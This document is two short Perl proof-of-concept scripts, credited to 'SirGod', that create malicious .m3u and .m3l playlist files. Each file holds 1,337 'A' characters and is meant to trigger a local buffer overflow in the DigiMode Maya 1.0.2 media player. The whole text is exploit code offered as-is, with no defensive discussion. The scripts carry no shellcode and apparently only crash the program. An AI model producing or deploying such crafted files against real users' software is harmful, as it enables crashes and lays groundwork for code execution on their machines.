#####################################################################################################
#                    DigiMode Maya 1.0.2 (.M3U File) Local Buffer Overflow PoC
#                 Discovered by SirGod  -  www.mortal-team.net & www.h4cky0u.org
######################################################################################################
my $chars= "A" x 1337;
my $file="sirgod.m3u";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file was created";
print "SirGod - www.mortal-team.net & www.h4cky0u.org";

#####################################################################################################
#                    DigiMode Maya 1.0.2 (.M3L File) Local Buffer Overflow PoC
#                 Discovered by SirGod  -  www.mortal-team.net & www.h4cky0u.org
######################################################################################################
my $chars= "A" x 1337;
my $file="sirgod.m3l";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file was created";
print "SirGod - www.mortal-team.net & www.h4cky0u.org";
